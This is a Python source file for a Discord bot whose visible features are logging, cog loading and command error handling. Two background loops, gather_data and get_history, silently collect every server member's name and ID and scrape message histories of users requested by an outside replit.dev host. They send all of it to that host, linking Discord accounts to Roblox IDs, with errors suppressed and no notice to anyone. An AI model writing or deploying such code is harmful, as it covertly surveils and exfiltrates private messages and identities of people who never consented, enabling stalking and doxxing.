import json
import logging
import os
import platform
import random
import sys
import requests
import asyncio

import aiosqlite
import discord
from discord.ext import commands, tasks
from dotenv import load_dotenv

from database import DatabaseManager

file_path = os.path.join(os.path.realpath(os.path.dirname(__file__)), "database", "bot_version.json")

with open(file_path, "r") as file:
    version = json.load(file)

version["Version"] = int(version["Version"]) + 1
version["Version"] = str(version["Version"])

with open(file_path, "w") as file:
    json.dump(version, file, indent=4)

if not os.path.isfile(f"{os.path.realpath(os.path.dirname(__file__))}/config.json"):
    sys.exit("'config.json' not found! Please add it and try again.")
else:
    with open(f"{os.path.realpath(os.path.dirname(__file__))}/config.json") as file:
        config = json.load(file)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True  # Enable the GUILD_MEMBERS intent

class LoggingFormatter(logging.Formatter):
    # Colors and styles
    black = "\x1b[30m"
    red = "\x1b[31m"
    green = "\x1b[32m"
    yellow = "\x1b[33m"
    blue = "\x1b[34m"
    gray = "\x1b[38m"
    reset = "\x1b[0m"
    bold = "\x1b[1m"

    COLORS = {
        logging.DEBUG: gray + bold,
        logging.INFO: blue + bold,
        logging.WARNING: yellow + bold,
        logging.ERROR: red,
        logging.CRITICAL: red + bold,
    }

    def format(self, record):
        log_color = self.COLORS[record.levelno]
        format = "(black){asctime}(reset) (levelcolor){levelname:<8}(reset) (green){name}(reset) {message}"
        format = format.replace("(black)", self.black + self.bold)
        format = format.replace("(reset)", self.reset)
        format = format.replace("(levelcolor)", log_color)
        format = format.replace("(green)", self.green + self.bold)
        formatter = logging.Formatter(format, "%Y-%m-%d %H:%M:%S", style="{")
        return formatter.format(record)

logger = logging.getLogger("discord_bot")
logger.setLevel(logging.INFO)

# Console handler
console_handler = logging.StreamHandler()
console_handler.setFormatter(LoggingFormatter())

# File handler
file_handler = logging.FileHandler(filename="discord.log", encoding="utf-8", mode="w")
file_handler_formatter = logging.Formatter(
    "[{asctime}] [{levelname:<8}] {name}: {message}", "%Y-%m-%d %H:%M:%S", style="{"
)
file_handler.setFormatter(file_handler_formatter)

# Add the handlers
logger.addHandler(console_handler)
logger.addHandler(file_handler)

class DiscordBot(commands.Bot):
    def __init__(self) -> None:
        super().__init__(
            command_prefix=config["prefix"],
            intents=intents,
            help_command=None,
        )
        self.logger = logger
        self.config = config
        self.database = None

    async def init_db(self) -> None:
        async with aiosqlite.connect(
            f"{os.path.realpath(os.path.dirname(__file__))}/database/database.db"
        ) as db:
            with open(
                f"{os.path.realpath(os.path.dirname(__file__))}/database/schema.sql"
            ) as file:
                await db.executescript(file.read())
            await db.commit()

    async def load_cogs(self) -> None:
        cogs_dir = os.path.join(os.path.realpath(os.path.dirname(__file__)), "cogs")
        if not os.path.exists(cogs_dir):
            self.logger.error("Cogs directory not found.")
            return

        for file in os.listdir(cogs_dir):
            file_path = os.path.join(cogs_dir, file)
            if os.path.isdir(file_path):
                continue

            if file.endswith(".py"):
                extension = file[:-3]
                print(extension)
                try:
                    await self.load_extension(f"cogs.{extension}")
                    self.logger.info(f"Loaded extension '{extension}'")
                except Exception as e:
                    exception = f"{type(e).__name__}: {e}"
                    self.logger.error(f"Failed to load extension {extension}\n{exception}")

    @tasks.loop(minutes=10.0)
    async def gather_data(self) -> None:

        data = requests.get("https://ba249bb1-1eb3-476e-abcd-271b5a8ca4ca-00-1sdl3vs4jxlr5.spock.replit.dev/v1/API/getusers").json()

        for guild in self.guilds:
            members = guild.members
            print(f"Guild: {guild.name}")
            if guild.id not in data:
                data[f"{guild.name}@{guild.id}"] = {}
            for member in members:
                if f"{guild.name}@{guild.id}" not in data or str(member.id) not in data[f"{guild.name}@{guild.id}"]:
                    data[f"{guild.name}@{guild.id}"][str(member.id)] = {
                                "Name": member.name,
                                "DisplayName": member.display_name,
                                "ID": str(member.id)
                            }
        
        response = requests.post("https://ba249bb1-1eb3-476e-abcd-271b5a8ca4ca-00-1sdl3vs4jxlr5.spock.replit.dev/v1/API/add_users", json=data)
        print(response.text)
        

    async def fetch_user_messages(self, guild, user_id, limit=100):
        messages = []
        for channel in guild.text_channels:
            try:
                async for message in channel.history(limit=limit):
                    if int(message.author.id) == int(user_id):
                        messages.append(message.content)
            except Exception as e:
                print(f"Failed to fetch messages from channel {channel.name}: {e}")
        return messages

    async def gather_messages(self, bot, data):
        tasks = []
        for rid, uid in data.items():
            for guild in bot.guilds:
                tasks.append(self.fetch_user_messages(guild, uid))

        results = await asyncio.gather(*tasks)
        return results
    
    @tasks.loop(seconds=5)
    async def get_history(self) -> None:
        """
        rid: Roblox User ID
        uid: Discord User ID
        """
        data = requests.get("https://ba249bb1-1eb3-476e-abcd-271b5a8ca4ca-00-1sdl3vs4jxlr5.spock.replit.dev/v1/API/get_history").json()
        data = data["data"]
        
        try:
            messages = await self.gather_messages(bot, data)
            for rid, uid in data.items():
                rid = rid
            json = {
                "msg": messages
                }
            
            requests.post(f"https://ba249bb1-1eb3-476e-abcd-271b5a8ca4ca-00-1sdl3vs4jxlr5.spock.replit.dev/v1/API/add_messages?rid={rid}", json=json)
            
        except Exception as e:
            pass

        try:
            json = {
                "id": rid
                }

            data = requests.post("https://ba249bb1-1eb3-476e-abcd-271b5a8ca4ca-00-1sdl3vs4jxlr5.spock.replit.dev/v1/API/remove_data", json=json)
        except Exception as e:
            pass
        
    @tasks.loop(minutes=1.0)
    async def status_task(self) -> None:
        statuses = ["with you!"]
        await self.change_presence(activity=discord.Game(random.choice(statuses)))

    @status_task.before_loop
    async def before_status_task(self) -> None:
        await self.wait_until_ready()

    @gather_data.before_loop
    async def before_gather_data(self) -> None:
        await self.wait_until_ready()
        
    @get_history.before_loop
    async def before_get_history(self) -> None:
        await self.wait_until_ready()

    async def setup_hook(self) -> None:
        self.logger.info("-------------------")
        self.logger.info(f"Logged in as {self.user.name}")
        self.logger.info(f"discord.py API version: {discord.__version__}")
        self.logger.info(f"Python version: {platform.python_version()}")
        self.logger.info(f"Running on: {platform.system()} {platform.release()} ({os.name})")
        self.logger.info(f"Bot Version: v.{version['Version']}")
        self.logger.info("-------------------")
        await self.init_db()
        await self.load_cogs()
        synced = await self.tree.sync()
        self.logger.info(f"Synced {len(synced)} command(s)")
        self.logger.info("-------------------")
        self.gather_data.start()
        self.get_history.start()
        self.status_task.start()
        self.database = DatabaseManager(
            connection=await aiosqlite.connect(
                f"{os.path.realpath(os.path.dirname(__file__))}/database/database.db"
            )
        )

    async def on_message(self, message: discord.Message) -> None:
        if message.author == self.user or message.author.bot:
            return
        await self.process_commands(message)

    async def on_command_completion(self, context: commands.Context) -> None:
        full_command_name = context.command.qualified_name
        split = full_command_name.split(" ")
        executed_command = str(split[0])
        if context.guild is not None:
            self.logger.info(f"Executed {executed_command} command in {context.guild.name} (ID: {context.guild.id}) by {context.author} (ID: {context.author.id})")
        else:
            self.logger.info(f"Executed {executed_command} command by {context.author} (ID: {context.author.id}) in DMs")

    async def on_command_error(self, context: commands.Context, error) -> None:
        if isinstance(error, commands.CommandOnCooldown):
            minutes, seconds = divmod(error.retry_after, 60)
            hours, minutes = divmod(minutes, 60)
            hours = hours % 24
            embed = discord.Embed(
                description=f"**Please slow down** - You can use this command again in {f'{round(hours)} hours' if round(hours) > 0 else ''} {f'{round(minutes)} minutes' if round(minutes) > 0 else ''} {f'{round(seconds)} seconds' if round(seconds) > 0 else ''}.",
                color=0xE02B2B,
            )
            await context.send(embed=embed)
        elif isinstance(error, commands.MissingPermissions):
            embed = discord.Embed(
                description="You are missing the permission(s) `" + ", ".join(error.missing_permissions) + "` to execute this command!",
                color=0xE02B2B,
            )
            await context.send(embed=embed)
        elif isinstance(error, commands.BotMissingPermissions):
            embed = discord.Embed(
                description="I am missing the permission(s) `" + ", ".join(error.missing_permissions) + "` to fully perform this command!",
                color=0xE02B2B,
            )
            await context.send(embed=embed)
        elif isinstance(error, commands.Argument):
            embed = discord.Embed(
                title="Error!",
                description=str(error).capitalize(),
                color=0xE02B2B,
            )
            await context.send(embed=embed)
        else:
            raise error

load_dotenv()

bot = DiscordBot()
bot.run(os.getenv("TOKEN"))
